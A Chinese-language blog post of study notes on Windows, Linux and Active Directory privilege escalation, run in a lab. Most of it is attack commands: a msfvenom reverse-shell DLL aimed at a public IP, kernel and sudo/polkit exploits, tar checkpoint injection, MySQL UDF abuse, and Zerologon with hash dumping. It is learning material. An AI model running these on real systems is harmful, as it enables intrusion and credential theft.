<h4 id><a href="#" class="headerlink" title></a><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230807151749141.png" alt="image-20230807151749141"></h4><p><strong>二、sc命令提权</strong></p>
<p>sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于控制面板中管理工具项中的服务。适用版本：windows 7、8、03、08、12、16（win2k3 ok 其他未测基本失败）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#创建一个名叫syscmd的新的交互式的cmd执行服务</span><br><span class="line">sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</span><br><span class="line">#运行服务</span><br><span class="line">sc start syscmd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230807164328775.png" alt="image-20230807164328775"></p>
<p><strong>三、ps命令提权</strong></p>
<p>适用版本：Test in Win2012 and Win2008 &amp; Win2016 其他未测 基本可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula -s -i -d cmd #调用运行cmd</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230807165259718.png" alt="image-20230807165259718"></p>
<h4 id="进程迁移注入获取"><a href="#进程迁移注入获取" class="headerlink" title="进程迁移注入获取"></a>进程迁移注入获取</h4><p>相当于开了一后门，注入到其他用户进程下！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MSF进程注入 </span><br><span class="line">ps //查看进程</span><br><span class="line">migrate PID //迁移对应PID</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230807201955162.png" alt="image-20230807201955162"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230807202003307.png" alt="image-20230807202003307"></p>
<h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。</p>
<p>所以当一个攻击者需要域管理员的操作权限时候，需通过假冒域管理员的令牌进行攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​                 </p>
<h4 id="BaybassUac"><a href="#BaybassUac" class="headerlink" title="BaybassUac"></a>BaybassUac</h4><p>为了远程执行目标的exe或者bat可执行文件绕过此安全机制，以此叫BypassUAC</p>
<p><strong>一、MSF</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Test in Win7 本地电脑 本地权限</span><br><span class="line">use exploit/windows/local/bypassua</span><br><span class="line">-Test in Win10 本地电脑 本地权限</span><br><span class="line">use exploit/windows/local/ask</span><br><span class="line">use exploit/windows/local/bypassuac_sluihijack</span><br><span class="line">use exploit/windows/local/bypassuac_silentcleanup</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230809145130663.png" alt="image-20230809145130663"></p>
<p><strong>二、UACME</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Akagi64.exe 41 msf1.exe</span><br><span class="line">Akagi64.exe 编号 调用执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230809150709615.png" alt="image-20230809150709615"></p>
<h4 id="DLL劫持提权"><a href="#DLL劫持提权" class="headerlink" title="DLL劫持提权"></a>DLL劫持提权</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</span><br><span class="line">1、应用程序加载的目录</span><br><span class="line">2、C:\Windows\System32</span><br><span class="line">3、C:\Windows\System</span><br><span class="line">4、C:\Windows</span><br><span class="line">5、当前工作目录Current Working Directory，CWD</span><br><span class="line">6、在PATH环境变量的目录（先系统后用户）</span><br><span class="line">过程：信息收集-进程调试-制作dll并上传-替换dll-启动应用后成功</span><br><span class="line">检测： ChkDllHijack 火绒剑</span><br><span class="line">项目：https://github.com/anhkgg/anhkgg-tools</span><br><span class="line">利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=121.36.36.99  lport=5555 -f dll -o m4ao.dll</span><br><span class="line">提前信息收集相关软件及DLL问题程序，本地调试成功后覆盖DLL实现利用</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230810005041133.png" alt="image-20230810005041133"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230810010854542.png" alt="image-20230810010854542"></p>
<h4 id="不带引号服务路径配合"><a href="#不带引号服务路径配合" class="headerlink" title="不带引号服务路径配合"></a>不带引号服务路径配合</h4><p>原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。</p>
<p>过程：检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230810012953873.png" alt="image-20230810012953873"></p>
<h4 id="不安全的服务权限配合"><a href="#不安全的服务权限配合" class="headerlink" title="不安全的服务权限配合"></a>不安全的服务权限配合</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。</span><br><span class="line">过程：检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</span><br><span class="line">检测脚本：accesschk PowerUp(PowerSploit)</span><br><span class="line">1、accesschk.exe -uwcqv &quot;administrators&quot; *</span><br><span class="line">2、Import-Module .\PowerUp.ps1</span><br><span class="line">Invoke-AllChecks</span><br><span class="line">https://github.com/411Hall/JAWS</span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit</span><br><span class="line">sc config &quot;test&quot; binpath=&quot;C:\Program.exe&quot;</span><br><span class="line">sc start test</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230810014006086.png" alt="image-20230810014006086"></p>
<h3 id="Linux-提权"><a href="#Linux-提权" class="headerlink" title="Linux 提权"></a>Linux 提权</h3><h4 id="Linux-配置安全SUID提权-探针-利用"><a href="#Linux-配置安全SUID提权-探针-利用" class="headerlink" title="Linux-配置安全SUID提权-探针&amp;利用"></a>Linux-配置安全SUID提权-探针&amp;利用</h4><p>漏洞成因：chmod u+s给予了suid u-s删除了suid</p>
<p>使程序在运行中受到了suid root权限的执行过程导致</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">手工命令探针安全：</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line">###参考</span><br><span class="line">https://pentestlab.blog/2017/09/25/suid-executables/</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230810164853601.png" alt="image-20230810164853601"></p>
<h4 id="Linux-内核漏洞本地用户提权-探针-利用"><a href="#Linux-内核漏洞本地用户提权-探针-利用" class="headerlink" title="Linux-内核漏洞本地用户提权-探针&amp;利用"></a>Linux-内核漏洞本地用户提权-探针&amp;利用</h4><p>Ubuntu 16.04版本存在本地提权漏洞，该漏洞存在于Linux内核带有的eBPF bpf(2)系统调用中，当用户提供恶意BPF程序使eBPF验证器模块产生计算错误，导致任意内存读写问题。 </p>
<p>攻击者（普通用户）可以利用该漏洞进行提权攻击，获取root权限，危害极大。</p>
<p>目前，主要是Debian和Ubuntu版本受影响，Redhat和CentOS不受影响。</p>
<p><strong>影响版本：</strong> </p>
<p>Linux内核：Linux Kernel Version 4.4 ~ 4.14</p>
<p>Ubuntu版本：16.04.01~ 16.04.04</p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230811041042808.png" alt="image-20230811041042808"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc 45010.c -o exp</span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br><span class="line">id</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230811041231572.png" alt="image-20230811041231572"></p>
<h4 id="Linux-内核漏洞Web用户提权-探针-利用-脏牛"><a href="#Linux-内核漏洞Web用户提权-探针-利用-脏牛" class="headerlink" title="Linux-内核漏洞Web用户提权-探针&amp;利用-脏牛"></a>Linux-内核漏洞Web用户提权-探针&amp;利用-脏牛</h4><p>内核提权整个过程：（linux-exploit-suggester获取信息哦）</p>
<p>vulnhub靶机-探针目标-CMS漏洞利用-脚本探针提权漏洞-利用内核提权-GG</p>
<p>内核漏洞提权过程：寻可用-下exp-上&#x2F;tmp-编译exp-执行(无权限用chmod)</p>
<p>nmap 192.168.46.0&#x2F;24</p>
<p>nmap -p1-65535 192.168.46.144</p>
<p>search drupal</p>
<p>use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2</p>
<p>set rhost 192.168.46.144</p>
<p>set rport 1898</p>
<p>run</p>
<p>upload &#x2F;root&#x2F;dcow.cpp &#x2F;tmp&#x2F;dcow.cpp</p>
<p>g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow dcow.cpp -lutil</p>
<p>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
<p>.&#x2F;dcow</p>
<p>su root</p>
<h4 id="Linux-内核漏洞本地用户提权-探针–DirtyPipe"><a href="#Linux-内核漏洞本地用户提权-探针–DirtyPipe" class="headerlink" title="Linux-内核漏洞本地用户提权-探针–DirtyPipe"></a>Linux-内核漏洞本地用户提权-探针–DirtyPipe</h4><p>Dirty Pipe(CVE-2022-0847)</p>
<p>5.8&lt;&#x3D;Linux kernel&lt;5.16.11&#x2F;5.15.25&#x2F;5.10.102</p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Dimage-20230811045642632.png" alt="image-20230811045642632"></p>
<h4 id="Liunx-环境变量文件配合-SUID-本地"><a href="#Liunx-环境变量文件配合-SUID-本地" class="headerlink" title="Liunx-环境变量文件配合 SUID-本地"></a>Liunx-环境变量文件配合 SUID-本地</h4><p>条件：ROOT用户对某个第三方程序给予了SUID权限</p>
<p>探针：<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root用户讲可执行文件进行编译，保证文件的正常授权运行，给予ROOT权限执行</span><br><span class="line">gcc demo.c -o shell</span><br><span class="line">chmod u+s shell</span><br><span class="line">普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限</span><br><span class="line">cp /bin/bash /tmp/ps</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./shell</span><br><span class="line">id</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230812234427970.png" alt="image-20230812234427970"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230813000206062.png" alt="image-20230813000206062"></p>
<h4 id="Linux-定时任务打包配合SUID-本地"><a href="#Linux-定时任务打包配合SUID-本地" class="headerlink" title="Linux-定时任务打包配合SUID-本地"></a>Linux-定时任务打包配合SUID-本地</h4><p><strong>背景</strong>：</p>
<p>运维为了防止数据丢失等，写个定时任务进行数据的打包压缩</p>
<p>由于数据打包压缩 tar命令</p>
<p>tar 可以尝试加参数调用其他命令执行</p>
<p><code>tar zxf 1.tar.gz /var/www/* </code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">提权通过获取计划任务执行文件信息进行提权</span><br><span class="line">1、相对路径和绝对路径执行</span><br><span class="line">2、计划任务命令存在参数调用</span><br><span class="line">利用计划任务的备份功能tar命令的参数利用</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint=1</span><br><span class="line">echo &#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; test.sh</span><br><span class="line">chmod +x test.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230813011428061.png" alt="image-20230813011428061"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230813011334675.png" alt="image-20230813011334675"></p>
<h4 id="Linux-定时任务文件权限配置不当-WEB-本地"><a href="#Linux-定时任务文件权限配置不当-WEB-本地" class="headerlink" title="Linux-定时任务文件权限配置不当-WEB&amp;本地"></a>Linux-定时任务文件权限配置不当-WEB&amp;本地</h4><p>利用不安全的权限分配操作导致的定时文件覆盖</p>
<p>chmod 777 775 等 所有者 组 其他成员说明</p>
<h4 id="Linux-第三方软件-MYSQL-数据库提权-WEB-本地"><a href="#Linux-第三方软件-MYSQL-数据库提权-WEB-本地" class="headerlink" title="Linux-第三方软件 MYSQL 数据库提权-WEB&amp;本地"></a>Linux-第三方软件 MYSQL 数据库提权-WEB&amp;本地</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、利用Mysql提权 searchsploit</span><br><span class="line">下载mysql udf kali poc进行编译</span><br><span class="line">wget https://www.exploit-db.com/download/1518</span><br><span class="line">mv 1518 raptor_udf.c</span><br><span class="line">gcc -g -c raptor_udf.c</span><br><span class="line">gcc -g -shared -o raptor_udf.so raptor_udf.o -lc</span><br><span class="line">mv raptor_udf.so 1518.so</span><br><span class="line">上传或下载1518到目标服务器</span><br><span class="line">wget https://xx.xx.xx.xx/1518.so</span><br><span class="line">进入数据库进行UDF导出</span><br><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/1518.so&#x27;));</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class="line">创建do_system函数调用</span><br><span class="line">create function do_system returns integer soname &#x27;1518.so&#x27;;</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">#配合使用find调用执行</span><br><span class="line">touch xiaodi</span><br><span class="line">find m4ao –exec &quot;whoami&quot; \;</span><br><span class="line">find m4ao –exec &quot;/bin/sh&quot; \;</span><br><span class="line">id</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230813055512924.png" alt="image-20230813055512924"></p>
<p><strong>无法外联走隧道-MDUT自动化数据库提权</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;R@v3nSecurity&#x27; WITH GRANT OPTION;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<p>开启外联一键梭哈</p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230813060209324.png" alt="image-20230813060209324"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230813060314286.png" alt="image-20230813060314286"></p>
<h4 id="Linux-Docker-组用户挂载目录-本地"><a href="#Linux-Docker-组用户挂载目录-本地" class="headerlink" title="Linux-Docker 组用户挂载目录-本地"></a>Linux-Docker 组用户挂载目录-本地</h4><p>Docker组挂载</p>
<p>普通用户在docker组，利用docker服务启动镜像挂载目录</p>
<p>从而来访问root目录、etc目录等敏感文件来进行权限提升。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Docker组挂载</span><br><span class="line">普通用户在docker组，利用docker服务启动镜像挂载目录</span><br><span class="line">从而来访问root目录、etc目录等敏感文件来进行权限提升。</span><br><span class="line">-复现：创建用户归类目录，添加到docker组</span><br><span class="line">useradd -d /home/test -m  test</span><br><span class="line">passwd test</span><br><span class="line">usermod -G docker test</span><br><span class="line">newgrp docker</span><br><span class="line">-利用：</span><br><span class="line">docker run -v /root:/mnt -it alpine</span><br><span class="line">主要的作用是：从Docker上面下载alpine镜像，然后运行;</span><br><span class="line">-v将容器外部的目录/root挂载到容器内部/mnt，使用-it参数进入容器shell。</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230813231509475.png" alt="image-20230813231509475"></p>
<h4 id="Linux-Sudo（CVE-2021-315-本地"><a href="#Linux-Sudo（CVE-2021-315-本地" class="headerlink" title="Linux-Sudo（CVE-2021-315)-本地"></a>Linux-Sudo（CVE-2021-315)-本地</h4><p>SUDO(CVE-2021-3156）</p>
<p>sudo: 1.8.2 - 1.8.31p2</p>
<p>sudo: 1.9.0 - 1.9.5p1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SUDO(CVE-2021-3156）</span><br><span class="line">sudo: 1.8.2 - 1.8.31p2</span><br><span class="line">sudo: 1.9.0 - 1.9.5p1</span><br><span class="line">-判断：sudoedit -s / 报错存在</span><br><span class="line">-利用：</span><br><span class="line">git clone https://github.com/blasty/CVE-2021-3156.git</span><br><span class="line">cd CVE-2021-3156</span><br><span class="line">make</span><br><span class="line">chmod a+x sudo-hax-me-a-sandwich</span><br><span class="line">./sudo-hax-me-a-sandwich 1</span><br></pre></td></tr></table></figure>





<h4 id="Linux-Polkit-CVE-2021-4034-本地"><a href="#Linux-Polkit-CVE-2021-4034-本地" class="headerlink" title="Linux-Polkit(CVE-2021-4034)-本地"></a>Linux-Polkit(CVE-2021-4034)-本地</h4><p>漏洞影响2009年5月至今的所有polkit版本</p>
<p>由于polkit是系统预装工具，所有存在polkit的linux系统均受影响</p>
<p>如：CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-判断：dpkg -l policykit-1</span><br><span class="line"></span><br><span class="line">-利用：</span><br><span class="line"></span><br><span class="line">git clone https://github.com/berdav/CVE-2021-4034.git</span><br><span class="line"></span><br><span class="line">cd CVE-2021-4034/</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">./cve-2021-4034</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230813232544996.png" alt="image-20230813232544996"></p>
<h3 id="WIN-域控提权"><a href="#WIN-域控提权" class="headerlink" title="WIN-域控提权"></a>WIN-域控提权</h3><h4 id="CVE-2014-6324"><a href="#CVE-2014-6324" class="headerlink" title="CVE-2014-6324"></a>CVE-2014-6324</h4><p><strong>利用条件：</strong></p>
<p>域控机没有打MS14-068的补丁(<strong>KB3011780</strong>)<br>攻击者拿下了一台域内的普通计算机,并获得普通域用户以及密码&#x2F;hash值，以及用户的SUID</p>
<p>一台主机的管理员权限</p>
<p><code>systeminfo |find &quot;3011780&quot;</code></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230816230852491.png" alt="image-20230816230852491"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br><span class="line">net time /domain</span><br><span class="line">net config workstation</span><br><span class="line">ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址</span><br><span class="line">ms14-068.exe -u WIN-36RQ4NC9BA8.m4ao.com -p Maojiawei@123 -s S-1-5-21-1201871558-4257707502-1963292888-1000 -d m4ao.m4ao.com</span><br><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptc &quot;TGT_test02@test.lab.ccache&quot;</span><br><span class="line">dir \\OWA2010CN-God.god.org\C$</span><br><span class="line">psexec \\OWA2010CN-God.god.org cmd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230817005004214.png" alt="image-20230817005004214"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230817012714738.png" alt="image-20230817012714738"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230817014819777.png" alt="image-20230817014819777"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230817014939316.png" alt="image-20230817014939316"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230817014854895.png" alt="image-20230817014854895"></p>
<h4 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a>CVE-2021-42287</h4><p>利用条件：</p>
<p>只需要域用户账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 sam_the_admin.py god/&#x27;mary:admin!@#45&#x27; -dc-ip 192.168.3.21 -shell</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230818154332582.png" alt="image-20230818154332582"></p>
<h4 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h4><p>CVE-2020-1472是继MS17010之后好用的NetLogon特权域控提权漏洞，</p>
<p>影响Windows Server 2008R2至Windows Server 2019的多个版本系统，</p>
<p>只要攻击者能访问到目标域控井且知道域控计算机名即可利用该漏洞.</p>
<p>该漏洞不要求当前计算机在域内,也不要求当前计算机操作系统为Windows.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">计算机名：nbtscan -v -h 192.168.3.21</span><br><span class="line"></span><br><span class="line">漏洞检测：python3 zerologon_tester.py OWA2010CN-GOD 192.168.3.21</span><br><span class="line"></span><br><span class="line">重置空密码：python3 cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21</span><br><span class="line"></span><br><span class="line">连接后导出：python3 secretsdump.py god.org/OWA2010CN-GOD\$@192.168.3.21 -no-pass</span><br><span class="line"></span><br><span class="line">WMI连接反弹：python3 wmiexec.py god/administrator@192.168.3.21 -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230818160004292.png" alt="image-20230818160004292"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230818160119055.png" alt="image-20230818160119055"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230818161507700.png" alt="image-20230818161507700"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230818163500456.png" alt="image-20230818163500456"></p>
<h3 id="CVE-2022-2693"><a href="#CVE-2022-2693" class="headerlink" title="CVE-2022-2693"></a>CVE-2022-2693</h3><p>利用条件</p>
<p>1、一个域内普通账号</p>
<p>2、域内存在证书服务器</p>
<p>获取CA结构名和计算机名</p>
<p>certutil -config - -ping</p>
<p>Kali添加访问域内信息 &#x2F;etc&#x2F;hosts </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.8.137 m4ao.com</span><br><span class="line">192.168.8.137 m4ao-MJW-CA</span><br><span class="line">192.168.8.137 mjw.m4ao.com</span><br></pre></td></tr></table></figure>

<p>申请证书</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -username mjw@m4ao.com -password Maojiawei@123 -ca m4ao-MJW-CA -template User</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230819045429270.png" alt="image-20230819045429270"></p>
<p><img src="/2023/09/12/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230819041602140.png" alt="image-20230819041602140"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">检测证书</span><br><span class="line">certipy auth -pfx mjw.pfx -dc-ip 192.168.8.137 </span><br></pre></td></tr></table></figure>

